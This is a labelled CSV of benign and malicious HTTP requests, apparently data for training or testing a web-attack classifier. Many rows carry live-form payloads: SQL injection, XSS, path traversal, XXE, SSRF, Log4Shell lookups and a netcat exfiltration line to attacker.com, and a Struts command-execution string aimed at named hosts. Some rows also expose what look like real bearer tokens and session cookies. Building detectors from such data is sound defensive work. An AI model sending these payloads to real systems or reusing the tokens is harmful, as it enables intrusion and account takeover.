method,path,query,headers,body,ua,label
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/index.php,option=com_loginbox&view=../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,id=1&id=2,,,1
POST,/login,,Host: example.com; Accept: */*,username=user250&password=pass135,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/index.php,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
PUT,/search,,Host: example.com; Accept: */*,input=admin'--,Nmap Scripting Engine,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/secure/ConfigurePortalPages!default.jspa,view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10",1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,query { __schema { types { name } } },,,1
GET,/api/v1/users,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/favicon.ico,,,,,0
GET,/,,POST /register (detailed user info),,,0
GET,/,,GET /checkout/step1,,,0
GET,/,,$(whoami),,,1
GET,/,,java\tscript:alert(1),,,1
GET,/,,GET /api/v1/products/101,,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/index.php,option=com_simpledownload&task=download&fileid=../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61",,"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61",1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,%0d%0a* CAPABILITY,,,1
PUT,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,http://attacker.com/shell.txt,,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /search?q=1+1=2,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,<body onload=alert(1)>,,,1
POST,/home,,Host: example.com; Accept: */*,username=user292&password=pass102,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,GET /sitemap.xml,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/index.action,redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D,Accept: */*; Accept-Encoding: gzip; Connection: close; Host: web.poc.vnshop.cloud; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/favicon.ico,,,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,Host: evil.com,,,1
GET,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,<script>alert('XSS')</script>,,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,| id,,,1
GET,/,,"POST /chat/init {""user_id"": ""u_55"", ""topic"": ""billing""}",,,0
GET,/,,"id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,|| ls -la,,,1
GET,/web-api/orders/3e62e87f-c4be-4543-8a55-15271f8f9317,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzQ4NDcyNzEiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiOThmZjkxNWUtMDU5ZS00ZDAxLWIzYjgtZjdmY2RhYzZmZjE3IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzQ4NDcyNzEiLCJzdWIiOiJXRUJTSVRFQDA3NzQ4NDcyNzEiLCJpYXQiOjE3NzA2MzAyMzcsImV4cCI6MTc3MTIzNTAzN30.G1IHsIjNdSyrmIYgEXfvakLyyfG-tSHMPLo7FqssvL0; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: ca637ef3-460e-4b92-bc29-dd87810a29c5",,python-requests/2.32.5,0
GET,/,,GET /images/logo.png,,,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,GET /search?q=security,,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,//////////////////etc/passwd,,,1
PUT,/index.php,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,%0als,,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,POST /register (detailed user info),,,0
GET,/install/lib/ajaxHandlers/ajaxServerSettingsChk.php,rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML: like Gecko) Chrome/121.0.0.0 Safari/537.36,,Mozilla/5.0 (Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML: like Gecko) Chrome/121.0.0.0 Safari/537.36,1
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,"POST /logs/client {""error"": ""Uncaught TypeError"", ""stack"": ""...""}",,,0
POST,/test-framework-api/node/node/sys-task/491eb876-fa4f-4f0e-98d8-bddda757c65a/next-monitor/1770630434,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiZTk3NGFhZDMtOGJlOS00M2E0LTkyNDMtYTk4MTBkYmY5NzdmIiwic3ViIjoiZGF0dG5Adm5wYXkudm4iLCJlbWFpbCI6ImRhdHRuQHZucGF5LnZuIiwidG9rZW5UeXBlIjoiTk9ERSJ9.X5BRa1Q9SUibJglv_XFcVmfjATWkh2bcOrxVdCQCBIjQApirF_4FcTxjGdOaXiiLo-7NmoBzr1lQIVl7JWkIkT5LbMBr_gCRt3SrUm6ANgh372Qey1r2fZOfuOoX1USoL_kdCXctEj6KAS4b25_xW-m_wOtDxjZVs_DVeclRm4NtjcOD9ELXUcZoFVoHacuOi5t_6kn50N1235T-zWpF8jePzfShgRpjNuBZ_i4sc7a8p8TMJjpmsh92-IArYM4F4Ol_OChc0JMnylWDO25D-xu0CNU_0qS1k6YS2BuJzQUZGKrkRjSDqyy40WHUGgMgyxq6jeudpxUIdbLK-PpJyg; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=b2b164d6a1333ffa32cfed9135d10c81260af9085c378045ede1b7cc5d7e7b13; __Host-grv_app_session=7d791dbd58ffd3a44a2a118d1c73ff7886e16e0637e88709e5c0119771dbed4d; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: 4d005d12-eb04-4a46-8904-dc8afdf73526",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/nagiosxi/includes/js/tables.js,1722359920,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: nagiosxi=hm7cas44vrq2v03sqogacvkir2; Host: mts.nagios.vnpay.vn; Referer: https://mts.nagios.vnpay.vn/nagiosxi/login.php; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: script; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; Sec-Purpose: prefetch;prerender; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/,,${jndi:ldap://attacker.com/a},,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/admin,q=<script>alert(1)</script>,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,GET /docs/api/introduction,,,0
GET,/,,GET /settings/security,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/,,"POST /careers/apply {""job_id"": ""eng_01"", ""name"": ""John Doe""}",,,0
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,GET /ws/notifications (Upgrade: websocket),,,0
GET,/favicon.ico,,,,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/common/run_cross_report.php,uniqueId=366314513&id=585&org=1&fmt=xls34403')%3balert(document.domain)%2f%2f952,"Accept-Encoding: gzip; Connection: close; Host: web.poc.vnshop.cloud; User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Safari/537.36",,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Safari/537.36",1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,__proto__[admin]=true,,,1
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,//////////////////etc/passwd,,,1
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,POST /webhooks/github (Push Event),,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,GET /search?q=1+1=2,,,0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user195&password=pass668,Mozilla/5.0 (Linux; Android 11),0
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,POST /graphql (query { me { name } }),,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /assets/js/bundle.min.js,,,0
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
POST,/search,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,curl/7.68.0,1
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/index.php,q=' OR 1=1--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,../../../../etc/passwd%00,,,1
GET,/,,GET /api/v1/tasks/rep_99/status,,,0
GET,/,,id=1&id=2,,,1
GET,/,,GET /settings/security,,,0
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /login,,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
POST,/search,q=phone,Host: example.com; Accept: */*,username=user105&password=pass337,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /user/mfa/setup-qr,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,{{constructor.constructor('alert(1)')()}},,,1
GET,/,,`uname -a`,,,1
GET,/search,q=../../../../etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /config/app-settings.json,,,0
GET,/,,POST /newsletter/subscribe,,,0
PUT,/login,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nikto/2.1.6,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /auth/logout/confirm,,,0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /fonts/inter-bold.woff2,,,0
POST,/home,,Host: example.com; Accept: */*,username=user286&password=pass427,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nmap Scripting Engine,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,GET /health,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,Host: evil.com,,,1
GET,/,,`uname -a`,,,1
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/favicon.ico,,,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/wp-content/plugins/mdc-youtube-downloader/includes/download.php,file=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",1
GET,/,,GET /config/app-settings.json,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,..%252f..%252f..%252fetc%252fhosts,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,{{7*7}}{{ '7'*7 }},,,1
GET,/,,../../../../etc/passwd,,,1
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,%0als,,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /health,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,<body onload=alert(1)>,,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /api/v1/locale/set?lang=en,,,0
POST,/search,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
GET,/favicon.ico,,,,,0
GET,/,,%0als,,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,id=1' OR '1'='1,,,1
GET,/api/module,type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14092.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.107 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 14092.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.107 Safari/537.36",1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,../../../../tmp/shell.php (inside zip archive),,,1
GET,/,,Host: evil.com,,,1
GET,/,,%0als,,,1
GET,/favicon.ico,,,,,0
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,PUT /api/v1/profile (JSON payload),,,0
GET,/,,GET /manifest.json,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,"POST /api/v1/sync/video {""id"": ""v_123"", ""position"": 450}",,,0
GET,/,,ac ed 00 05 73 72 00 12 ...,,,1
GET,/,,GET /auth/logout/confirm,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /api/v1/ping,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/favicon.ico,,,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,java\tscript:alert(1),,,1
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,${os.system('id')},,,1
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,Host: evil.com,,,1
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /locales/vi-VN.json,,,0
